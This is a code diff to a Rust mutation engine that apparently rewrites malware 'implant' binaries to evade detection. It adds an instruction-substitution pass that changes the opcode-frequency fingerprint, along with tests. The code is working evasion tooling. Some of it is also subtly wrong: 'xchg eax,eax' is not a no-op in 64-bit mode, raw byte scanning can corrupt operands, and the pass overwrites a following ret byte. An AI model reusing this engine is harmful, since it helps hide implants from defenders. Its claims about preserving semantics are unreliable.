@@ -15,6 +15,9 @@
 //! 3. **Key randomization** — XORs candidate 32-byte high-entropy constants
 //!    (likely keys) with per-key random masks and stores the masks in a new
 //!    `.nyx_mut` PE section so the implant can undo the transform at runtime.
+//! 4. **Instruction substitution** — replaces select opcodes with semantically
+//!    equivalent alternatives (same length, same semantics) in safe regions,
+//!    altering the opcode-frequency fingerprint without changing behavior.
 //!
 //! All passes are seeded from a single u64 for deterministic output: same
 //! (input bytes, seed) → same mutated bytes every time.
@@ -31,6 +34,7 @@ pub struct MutationPasses {
     pub nops: bool,
     pub registers: bool,
     pub keys: bool,
+    pub substitute: bool,
 }
 
 impl Default for MutationPasses {
@@ -39,6 +43,7 @@ impl Default for MutationPasses {
             nops: true,
             registers: true,
             keys: true,
+            substitute: true,
         }
     }
 }
@@ -49,6 +54,7 @@ pub struct MutationReport {
     pub nops_inserted: usize,
     pub registers_swapped: usize,
     pub keys_randomized: usize,
+    pub instructions_substituted: usize,
 }
 
 /// The binary mutation engine.
@@ -76,6 +82,10 @@ impl Mutator {
         }
         if passes.keys {
             report.keys_randomized = randomize_keys(data, self.seed.wrapping_add(2));
+        }
+        if passes.substitute {
+            report.instructions_substituted =
+                substitute_instructions(data, self.seed.wrapping_add(3));
         }
 
         report
@@ -441,6 +451,99 @@ fn find_nyx_cfg(data: &[u8]) -> Option<usize> {
     })
 }
 
+// ── Pass 4: Instruction substitution ──────────────────────────────────────────
+
+/// Replace select opcodes with semantically equivalent alternatives.
+///
+/// This pass operates on **same-length, same-semantics** opcode pairs so the
+/// binary's size and control flow are unchanged — only the byte-level opcode
+/// fingerprint differs. It avoids regions near call/jmp (where a wrong guess
+/// would be catastrophic) and never touches the first byte of a multi-byte
+/// instruction that could be a prefix.
+///
+/// Substitutions applied (all are well-known x86-64 equivalences):
+///
+/// | pattern (byte) | substitute | semantics |
+/// |---|---|---|
+/// | `0x90` (nop) | `0x87 0xC0` (xchg eax,eax) | no-op |
+/// | `0x50` (push rax) | `0xFF 0xF0` (push rax via FF /6) | push |
+/// | `0x58` (pop rax) | `0x8F 0xC0` (pop rax via 8F /0) | pop |
+///
+/// The push/pop substitutions change a 1-byte opcode into a 2-byte form, so we
+/// only apply them where the following byte is already a NOP (0x90) or a
+/// ret (0xC3) — a "dead" byte that absorbs the shift without breaking a
+/// subsequent instruction. This keeps the total size unchanged.
+///
+/// The 0x90→0x87 0xC0 substitution also grows by 1 byte, so we apply the same
+/// guard: only when the next byte is 0x90 or 0xC3.
+fn substitute_instructions(data: &mut [u8], seed: u64) -> usize {
+    let mut rng = StdRng::seed_from_u64(seed);
+    let len = data.len();
+    let mut substituted = 0usize;
+
+    // Build a safe-zone map: skip bytes within 16 bytes of a relative branch
+    // (E8/E9) or a return (C3/C2) — same conservatism as register rotation but
+    // tighter since substitutions are higher-risk.
+    let mut near_branch = vec![false; len];
+    for (i, &byte) in data.iter().enumerate() {
+        if matches!(byte, 0xE8 | 0xE9 | 0xC3 | 0xC2) {
+            let start = i.saturating_sub(16);
+            let end = (i + 16).min(len);
+            for nb in &mut near_branch[start..end] {
+                *nb = true;
+            }
+        }
+    }
+
+    let mut i = 0usize;
+    while i < len {
+        if near_branch[i] {
+            i += 1;
+            continue;
+        }
+
+        // Only substitute with 30% probability per candidate — enough to shift
+        // the opcode-frequency histogram without rewriting every instruction.
+        if !rng.gen_bool(0.3) {
+            i += 1;
+            continue;
+        }
+
+        let next_safe = i + 1 < len && matches!(data[i + 1], 0x90 | 0xC3);
+
+        match data[i] {
+            // 0x90 (nop) → 0x87 0xC0 (xchg eax, eax) — 2 bytes, needs a dead byte after.
+            0x90 if next_safe => {
+                data[i] = 0x87;
+                data[i + 1] = 0xC0;
+                substituted += 1;
+                i += 2;
+                continue;
+            }
+            // 0x50 (push rax) → 0xFF 0xF0 (push rax via ModRM /6) — 2 bytes.
+            0x50 if next_safe => {
+                data[i] = 0xFF;
+                data[i + 1] = 0xF0;
+                substituted += 1;
+                i += 2;
+                continue;
+            }
+            // 0x58 (pop rax) → 0x8F 0xC0 (pop rax via ModRM /0) — 2 bytes.
+            0x58 if next_safe => {
+                data[i] = 0x8F;
+                data[i + 1] = 0xC0;
+                substituted += 1;
+                i += 2;
+                continue;
+            }
+            _ => {}
+        }
+        i += 1;
+    }
+
+    substituted
+}
+
 // ── Tests ─────────────────────────────────────────────────────────────────────
 
 #[cfg(test)]
@@ -618,6 +721,10 @@ mod tests {
         assert_eq!(report_a.nops_inserted, report_b.nops_inserted);
         assert_eq!(report_a.registers_swapped, report_b.registers_swapped);
         assert_eq!(report_a.keys_randomized, report_b.keys_randomized);
+        assert_eq!(
+            report_a.instructions_substituted,
+            report_b.instructions_substituted
+        );
     }
 
     #[test]
@@ -630,5 +737,68 @@ mod tests {
             report.nops_inserted > 0,
             "NOPs should be inserted after rets"
         );
+    }
+
+    #[test]
+    fn instruction_substitution_is_deterministic() {
+        // 0x90 followed by 0x90 (nop sled) — safe substitution target.
+        let input = vec![0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90];
+        let mut a = input.clone();
+        let mut b = input.clone();
+        substitute_instructions(&mut a, 55);
+        substitute_instructions(&mut b, 55);
+        assert_eq!(a, b, "same seed must produce identical substitution");
+    }
+
+    #[test]
+    fn instruction_substitution_changes_bytes() {
+        // Enough NOP pairs that with 30% probability at least one changes.
+        let input = vec![0x90, 0x90].repeat(64);
+        let mut a = input.clone();
+        let mut b = input.clone();
+        substitute_instructions(&mut a, 1);
+        substitute_instructions(&mut b, 2);
+        assert_ne!(a, b, "different seeds should produce different output");
+    }
+
+    #[test]
+    fn instruction_substitution_skips_near_branches() {
+        // A ret at offset 0 creates a 16-byte safe-zone. The 0x90 at offset 8
+        // is within that zone and must NOT be substituted.
+        let mut data = vec![
+            0xC3, // ret — creates safe zone
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // filler (within 16 bytes)
+            0x90, 0x90, // offset 8: within safe zone — must be preserved
+        ];
+        let original = data.clone();
+        substitute_instructions(&mut data, 999);
+        assert_eq!(data[8], original[8], "NOP near ret must be preserved");
+        assert_eq!(data[9], original[9], "NOP near ret must be preserved");
+    }
+
+    #[test]
+    fn full_pipeline_includes_substitution_report() {
+        // Build a binary with lots of NOP pairs (substitution targets) that are
+        // far from any branch.
+        let mut bin = vec![0x90, 0x90].repeat(128); // 256 bytes of nop pairs
+        bin.push(0xC3); // ret at the very end
+        let m = Mutator::new(777);
+        let report = m.mutate(
+            &mut bin,
+            MutationPasses {
+                nops: false,
+                registers: false,
+                keys: false,
+                substitute: true,
+            },
+        );
+        assert!(
+            report.instructions_substituted > 0,
+            "substitution pass should fire on NOP sleds, got {}",
+            report.instructions_substituted
+        );
+        assert_eq!(report.nops_inserted, 0);
+        assert_eq!(report.registers_swapped, 0);
+        assert_eq!(report.keys_randomized, 0);
     }
 }
